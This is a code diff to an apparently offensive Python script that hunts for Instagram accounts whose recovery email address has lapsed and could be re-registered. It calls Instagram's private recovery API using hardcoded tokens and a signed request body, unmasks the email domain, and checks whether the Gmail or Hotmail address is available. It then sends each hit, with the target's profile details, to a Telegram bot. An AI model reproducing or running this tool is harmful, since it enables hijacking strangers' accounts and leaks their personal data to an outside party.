@@ -165,6 +165,83 @@ by: @m0hsvn'''
             print("\n[!] Stopping...")
             sys.exit(0)
 
+    def get_recovery_email(self, username):
+        """Get recovery email from Instagram"""
+        try:
+            headers = {
+                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+                'X-Pigeon-Rawclienttime': '1700251574.982',
+                'X-IG-Connection-Speed': '-1kbps',
+                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+                'X-IG-Bandwidth-TotalBytes-B': '0',
+                'X-IG-Bandwidth-TotalTime-MS': '0',
+                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
+                'X-IG-Connection-Type': 'WIFI',
+                'X-IG-Capabilities': '3brTvw==',
+                'X-IG-App-ID': '567067343352427',
+                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+                'Accept-Language': 'en-GB, en-US',
+                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Accept-Encoding': 'gzip, deflate',
+                'Host': 'i.instagram.com',
+                'X-FB-HTTP-Engine': 'Liger',
+                'Connection': 'keep-alive',
+            }
+            data = {
+                'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"{username}"}}',
+                'ig_sig_key_version': '4',
+            }
+            response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data, timeout=10)
+            recovery_email = response.json()['email']
+            return recovery_email
+        except:
+            return None
+
+    def guess_domain_from_recovery(self, recovery_email):
+        """Guess the actual domain from masked recovery email"""
+        if not recovery_email:
+            return None
+        
+        try:
+            # Extract domain part (e.g., "g***l.com" or "h******.com")
+            domain_part = recovery_email.split('@')[1].lower()
+            
+            # Common email domains and their patterns
+            domains = {
+                'gmail.com': ['g***l.com', 'gm**l.com', 'gma*l.com', 'gmail.com', 'g****l.com'],
+                'hotmail.com': ['h*****l.com', 'ho****l.com', 'hot***l.com', 'hotm**l.com', 'hotma*l.com', 'hotmail.com', 'h******l.com'],
+                'outlook.com': ['o*****k.com', 'ou****k.com', 'out***k.com', 'outl**k.com', 'outlo*k.com', 'outlook.com'],
+                'yahoo.com': ['y***o.com', 'ya**o.com', 'yah*o.com', 'yahoo.com', 'y****o.com'],
+                'aol.com': ['a*l.com', 'ao*.com', 'aol.com', 'a**l.com'],
+                'icloud.com': ['i****d.com', 'ic***d.com', 'icl**d.com', 'iclo*d.com', 'icloud.com'],
+                'live.com': ['l**e.com', 'li*e.com', 'liv*.com', 'live.com'],
+                'msn.com': ['m*n.com', 'ms*.com', 'msn.com'],
+                'me.com': ['m*.com', 'me.com'],
+                'mail.com': ['m**l.com', 'ma*l.com', 'mai*.com', 'mail.com']
+            }
+            
+            # Try to match the masked domain
+            for actual_domain, patterns in domains.items():
+                for pattern in patterns:
+                    if self.match_pattern(domain_part, pattern):
+                        return actual_domain
+            
+            # If no match, return None
+            return None
+        except:
+            return None
+
+    def match_pattern(self, masked, pattern):
+        """Check if masked domain matches pattern"""
+        if len(masked) != len(pattern):
+            return False
+        
+        for m, p in zip(masked, pattern):
+            if p != '*' and m != p:
+                return False
+        return True
+
     def validate_recovery_email(self, username, recovery_email):
         """Validate that recovery email matches username pattern"""
         if not recovery_email or recovery_email == "None":
@@ -282,42 +359,8 @@ by: @m0hsvn'''
         except:
             return 'Unknown'
 
-    def get_info(self, username, domen):
+    def get_info(self, username, domen, recovery_email):
         try:
-            headers = {
-                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
-                'X-Pigeon-Rawclienttime': '1700251574.982',
-                'X-IG-Connection-Speed': '-1kbps',
-                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
-                'X-IG-Bandwidth-TotalBytes-B': '0',
-                'X-IG-Bandwidth-TotalTime-MS': '0',
-                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
-                'X-IG-Connection-Type': 'WIFI',
-                'X-IG-Capabilities': '3brTvw==',
-                'X-IG-App-ID': '567067343352427',
-                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
-                'Accept-Language': 'en-GB, en-US',
-                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
-                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'Accept-Encoding': 'gzip, deflate',
-                'Host': 'i.instagram.com',
-                'X-FB-HTTP-Engine': 'Liger',
-                'Connection': 'keep-alive',
-            }
-            data = {
-                'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"{username}"}}',
-                'ig_sig_key_version': '4',
-            }
-            try:
-                response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data, timeout=10)
-                rest = response.json()['email']
-            except:
-                rest = None
-
-            # Validate recovery email matches username FIRST
-            if not self.validate_recovery_email(username, rest):
-                return False  # Not a valid hit, skip
-
             # Get profile info
             headers = {
                 'accept': '*/*',
@@ -390,7 +433,7 @@ by: @m0hsvn'''
 🆔 ID: {id if id else 'None'}
 📝 Name: {full_name if full_name else 'None'}
 💬 Bio: {biography if biography else 'None'}
-📩 Recovery: {rest if rest else 'None'}
+📩 Recovery: {recovery_email if recovery_email else 'None'}
 ═══════════════════════════
 by: @m0hsvn'''
 
@@ -404,22 +447,29 @@ by: @m0hsvn'''
                 pass
 
             # Send to Telegram
-            max_retries = 5
-            for attempt in range(max_retries):
+            print(f"\n[+] Attempting to send hit to Telegram...")
+            print(f"[+] Token: {self.token[:20]}...")
+            print(f"[+] Chat ID: {self.id}")
+            
+            while True:
                 try:
-                    response = requests.get(
+                    response = requests.post(
                         f'https://api.telegram.org/bot{self.token}/sendMessage',
-                        params={'chat_id': self.id, 'text': info},
-                        timeout=10
+                        data={'chat_id': self.id, 'text': info},
+                        timeout=15
                     )
+                    print(f"[+] Telegram API Response Status: {response.status_code}")
+                    print(f"[+] Telegram API Response: {response.text[:200]}")
+                    
                     if response.status_code == 200:
+                        print("\n✅ Hit sent to Telegram successfully!")
                         return True
                     else:
-                        time_module.sleep(2)
+                        print(f"\n❌ Telegram API error {response.status_code}: {response.text}")
+                        time_module.sleep(3)
                 except Exception as e:
-                    if attempt == max_retries - 1:
-                        print(f"\n[!] Telegram send error: {e}")
-                    time_module.sleep(2)
+                    print(f"\n❌ Exception sending to Telegram: {str(e)}")
+                    time_module.sleep(3)
             
             return True
 
@@ -495,67 +545,82 @@ by: @m0hsvn'''
                     sys.stdout.write(f'\n[📊] Hits: {self.hits} | Bad IG: {self.bad_instgram} | Bad Email: {self.bad_email} | Good IG: {self.good_insgram}\n')
                     sys.stdout.flush()
                     
-                    api1 = choice('122')
-                    api2 = choice('122')
-                    email1 = username + '@gmail.com'
-                    email2 = username + '@hotmail.com'
+                    # STEP 1: Check if Instagram account exists
+                    api_choice = choice('122')
+                    print(f"[*] Checking if Instagram account exists: {username}")
                     
-                    # Check Gmail
-                    print(f"[*] Checking Instagram for: {email1}")
-                    if api1 == '1':
-                        s11 = self.insta1(email1)
-                    elif api1 == '2':
-                        s11 = self.insta2(email1)
+                    if api_choice == '1':
+                        has_instagram = self.insta1(f"{username}@gmail.com")  # Just checking if account exists
+                    elif api_choice == '2':
+                        has_instagram = self.insta2(f"{username}@gmail.com")
                     else:
-                        s11 = False
+                        has_instagram = False
                     
-                    if s11 == True:
-                        self.good_insgram += 1
-                        print(f"[✓] Instagram exists for: {email1}")
-                        print(f"[*] Checking Gmail availability for: {username}")
-                        qq = self.check_gmail(email1)
-                        if qq == True:
-                            print(f"[✓] Gmail available for: {username}")
-                            username_part, domen = email1.split('@')
-                            result = self.get_info(username_part, domen)
-                            if result == True:
-                                self.hits += 1
-                                print(f"[🎯] HIT FOUND! Total hits: {self.hits}")
-                        else:
-                            self.bad_email += 1
-                            print(f"[✗] Gmail NOT available for: {username}")
-                    else:
+                    if not has_instagram:
                         self.bad_instgram += 1
-                        print(f"[✗] Instagram does NOT exist for: {email1}")
+                        print(f"[✗] No Instagram account for: {username}")
+                        continue
                     
-                    # Check Hotmail
-                    print(f"[*] Checking Instagram for: {email2}")
-                    if api2 == '1':
-                        s22 = self.insta1(email2)
-                    elif api2 == '2':
-                        s22 = self.insta2(email2)
-                    else:
-                        s22 = False
+                    self.good_insgram += 1
+                    print(f"[✓] Instagram account EXISTS for: {username}")
                     
-                    if s22 == True:
-                        self.good_insgram += 1
-                        print(f"[✓] Instagram exists for: {email2}")
-                        print(f"[*] Checking Hotmail availability for: {username}")
-                        qq = self.check_hotmail(email2)
-                        if qq == True:
-                            print(f"[✓] Hotmail available for: {username}")
-                            username_part, domen = email2.split('@')
-                            result = self.get_info(username_part, domen)
-                            if result == True:
-                                self.hits += 1
-                                print(f"[🎯] HIT FOUND! Total hits: {self.hits}")
-                        else:
-                            self.bad_email += 1
-                            print(f"[✗] Hotmail NOT available for: {username}")
+                    # STEP 2: Get recovery email from Instagram
+                    print(f"[*] Getting recovery email for: {username}")
+                    recovery_email = self.get_recovery_email(username)
+                    
+                    if not recovery_email:
+                        print(f"[✗] Could not get recovery email for: {username}")
+                        continue
+                    
+                    print(f"[✓] Recovery email found: {recovery_email}")
+                    
+                    # STEP 3: Validate first and last letter match
+                    if not self.validate_recovery_email(username, recovery_email):
+                        print(f"[✗] Recovery email doesn't match username pattern!")
+                        print(f"    Username: {username} (first: {username[0]}, last: {username[-1]})")
+                        print(f"    Recovery: {recovery_email}")
+                        continue
+                    
+                    print(f"[✓] Recovery email matches username pattern! ✅")
+                    
+                    # STEP 4: Guess the actual domain from masked recovery email
+                    actual_domain = self.guess_domain_from_recovery(recovery_email)
+                    
+                    if not actual_domain:
+                        print(f"[✗] Could not determine actual domain from: {recovery_email}")
+                        continue
+                    
+                    print(f"[✓] Guessed domain: {actual_domain}")
+                    
+                    # STEP 5: Check if that email is available
+                    full_email = f"{username}@{actual_domain}"
+                    print(f"[*] Checking if email is available: {full_email}")
+                    
+                    is_available = False
+                    if actual_domain in ['hotmail.com', 'outlook.com', 'live.com', 'msn.com']:
+                        is_available = self.check_hotmail(full_email)
+                    elif actual_domain in ['gmail.com']:
+                        is_available = self.check_gmail(full_email)
                     else:
-                        self.bad_instgram += 1
-                        print(f"[✗] Instagram does NOT exist for: {email2}")
-                        
+                        # For other domains, we can't check availability, but still consider it a hit
+                        print(f"[!] Cannot check availability for {actual_domain}, assuming available")
+                        is_available = True
+                    
+                    if not is_available:
+                        self.bad_email += 1
+                        print(f"[✗] Email NOT available: {full_email}")
+                        continue
+                    
+                    print(f"[✓] Email IS available: {full_email}")
+                    
+                    # STEP 6: This is a HIT! Send to Telegram
+                    print(f"[🎯] HIT FOUND! Sending to Telegram...")
+                    result = self.get_info(username, actual_domain, recovery_email)
+                    
+                    if result == True:
+                        self.hits += 1
+                        print(f"[🎯] SUCCESS! Total hits: {self.hits}")
+                    
             except Exception as e:
                 print(f"[!] Error in home loop: {str(e)}")
                 time_module.sleep(1)
